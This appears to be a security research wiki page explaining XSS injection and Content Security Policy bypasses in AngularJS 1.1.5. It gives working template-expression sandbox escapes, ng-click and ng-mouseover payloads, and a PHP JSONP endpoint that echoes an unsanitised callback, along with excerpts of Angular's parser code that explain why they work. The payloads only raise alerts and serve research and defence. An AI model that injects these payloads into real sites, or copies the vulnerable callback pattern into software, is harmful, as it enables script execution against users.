#summary One-sentence summary of this page.

= Introduction =

"AngularJS is an open-source JavaScript framework, maintained by Google, that assists with running single-page applications. Its goal is to augment browser-based applications with model–view–controller (MVC) capability, in an effort to make both development and testing easier.

The library reads in HTML that contains additional custom tag attributes; it then obeys the directives in those custom attributes, and binds input or output parts of the page to a model represented by standard JavaScript variables. The values of those JavaScript variables can be manually set, or retrieved from static or dynamic JSON resources."

From http://en.wikipedia.org/wiki/AngularJS

= Injection Attacks =

AngularJS offers frontend developers a scope object that attempts to isolate global variables from the templating work-flow and keep things lean and "Angular-only". This makes sense - and to be fair, the AngularJS documentation explicitly states that the scope object is not considered to be a sandbox. And indeed it is none. With a simple JavaScript trick one can break out of this "non-sandbox" and execute arbitrary code in window and other host objects.

== XSS in Template ==

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
{{constructor.constructor('alert(1)')()}}
</div>
}}}

== XSS via class-attribute ==

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
    <b class="ng-style: {x:constructor.constructor('alert(1)')()};" />
</div>
}}}

== XSS via data attributes ==

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<b data-ng-app data-ng-style="constructor.constructor('alert(1)')()" />
}}}

= CSP Bypasses with AngularJS =

AngularJS is one of the very few - if not the only - MVC frameworks that has an explicit CSP mode. That means, developers can use the powerful templating engine despite the restrictions on eval and Function CSP imposes.

That nevertheless bears risks and leads to an interesting phenomenon: In case an attacker can inject HTML into an AngularJS application context, the injected JavaScript will be executed although CSP should protect from this. in other words: AngularJS brings inline-JavaScript on CSP-protected websites back - by using its own attributes and a complex string parsing and event binding mechanism we will discuss later on this page.

== XSS via Click & Hover (ng-click & ng-mouseover attribute) ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
</head>
<body ng-click="$event.view.alert(1)">
	Click me
	<h1 ng-mouseover="$event.target.ownerDocument.defaultView.alert(2)">Hover me</h1>
</body>
}}}

== XSS via Click (data-ng-click attribute) ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
</head>
<body data-ng-click="$event.view.alert(1)" onclick="alert(2)">Click me</body>
}}}

== XSS via Template Cache ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-csp ng-app="foo">
<head>
<script
src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<script src="test.js"></script>
</head>
<body>
<div>
  <ng-include src="'one.html'"></ng-include>
</div>
</body>
</html>
}}}

test.js
{{{
var foo = angular.module("foo", []);
foo.run(['$templateCache', function($templateCache) {
    $templateCache.put('one.html', '<h1 data-ng-click="$event.view.alert(1)">Click me</h1>');
}]);
}}}

== XSS on Hover with CSS-based Overlay ==

{{{
var foo = angular.module("foo", []);
foo.run(['$templateCache', function($templateCache) {
    $templateCache.put('one.html', '<h1 data-ng-style="{border: \'1000px solid red\'}" data-ng-mouseover="$event.view.alert(1)">Click me</h1>');
}]);
}}}

== XSS via JSON Callback ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<script src="test.js"></script>
</head>
<body>
<div ng-controller="FetchCtrl">
<input type="text" ng-model="url" size="80" />
<button ng-click="fetch()">fetch</button>
</div>
</body>
</html>
}}}

test.js
{{{
function FetchCtrl($scope, $http, $templateCache) {
    $scope.method = 'JSONP';
    $scope.fetch = function() {
    $scope.code = null;
    $scope.response = null;
    $http({method: $scope.method, url: $scope.url, cache: $templateCache}).
    	success(function(data, status) {
    		$scope.status = status;
    		$scope.data = data;
    	})
    };
    $scope.updateModel = function(method, url) {
    	$scope.method = method;
    	$scope.url = url;
 	};
}
function foo(){
	alert('JSON callback received')
}
}}}

test.json
{{{
<?php echo $_GET['callback']; ?>({"name":"Super Hero","salutation":"Namaskar","greeting":"Namaskar Super Hero!"});
}}}

== Eval via Function (no CSP) ==

Below we can see the code that causes the XSS (in non-CSP modes). Again the framework makes extensive use of implicit `eval` using the `Function` constructor:

{{{
    function getterFn(path, csp) {
        if (getterFnCache.hasOwnProperty(path)) {
            return getterFnCache[path];
        }
        
        var pathKeys = path.split('.'), 
        pathKeysLength = pathKeys.length, 
        fn;
        
        if (csp) {
            fn = (pathKeysLength < 6) 
            ? cspSafeGetterFn(pathKeys[0], pathKeys[1], pathKeys[2], pathKeys[3], pathKeys[4]) 
            : function(scope, locals) {
                var i = 0, val;
                do {
                    val = cspSafeGetterFn(
                    pathKeys[i++], pathKeys[i++], pathKeys[i++], pathKeys[i++], pathKeys[i++]
                    )(scope, locals);
                    
                    locals = undefined; // clear after first iteration
                    scope = val;
                } while (i < pathKeysLength);
                return val;
            }
        } else {
            var code = 'var l, fn, p;\n';
            forEach(pathKeys, function(key, index) {
                code += 'if(s === null || s === undefined) return s;\n' + 
                'l=s;\n' + 
                's=' + (index 
                // we simply dereference 's' on any .dot notation
                ? 's' 
                // but if we are first then we check locals first, and if so read it first
                : '((k&&k.hasOwnProperty("' + key + '"))?k:s)') + '["' + key + '"]' + ';\n' + 
                'if (s && s.then) {\n' + 
                ' if (!("$$v" in s)) {\n' + 
                ' p=s;\n' + 
                ' p.$$v = undefined;\n' + 
                ' p.then(function(v) {p.$$v=v;});\n' + 
                '}\n' + 
                ' s=s.$$v\n' + 
                '}\n';
            });
            code += 'return s;';
            fn = Function('s', 'k', code); // s=scope, k=locals
            fn.toString = function() {
                return code;
            };
        }
        
        return getterFnCache[path] = fn;
    }
}}}

== "Eval" via Event Binding (using CSP) ==

More interesting is the way how AngularJS enables inline JavaScript despite restrictive CSP headers being in place. On initialization of the page, AngularJS walks over all event-handling attributes and binds the matching event. Then, upon execution of the event, the content of the attribute is being parsed,tested for validity and ultimately executed. Using events, the parser and direct object access, AngularJS manages to perform a "string-to-code" without using any `eval` or `Function`. Templating despite CSP works - but injection work as well.

{{{
var ngEventDirectives = {};
forEach(
  'click dblclick mousedown mouseup mouseover mouseout mousemove mouseenter mouseleave keydown keyup keypress'.split(' '),
  function(name) {
    var directiveName = directiveNormalize('ng-' + name);
    ngEventDirectives[directiveName] = ['$parse', function($parse) {
      return function(scope, element, attr) {
        var fn = $parse(attr[directiveName]);
        element.bind(lowercase(name), function(event) {
          scope.$apply(function() {
            fn(scope, {$event:event});
          });
        });
      };
    }];
  }
);

[...]

function cspSafeGetterFn(key0, key1, key2, key3, key4) {
  return function(scope, locals) {
    var pathVal = (locals && locals.hasOwnProperty(key0)) ? locals : scope,
        promise;

    if (pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key0];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key1 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key1];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key2 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key2];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key3 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key3];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key4 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key4];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    return pathVal;
  };
}
}}}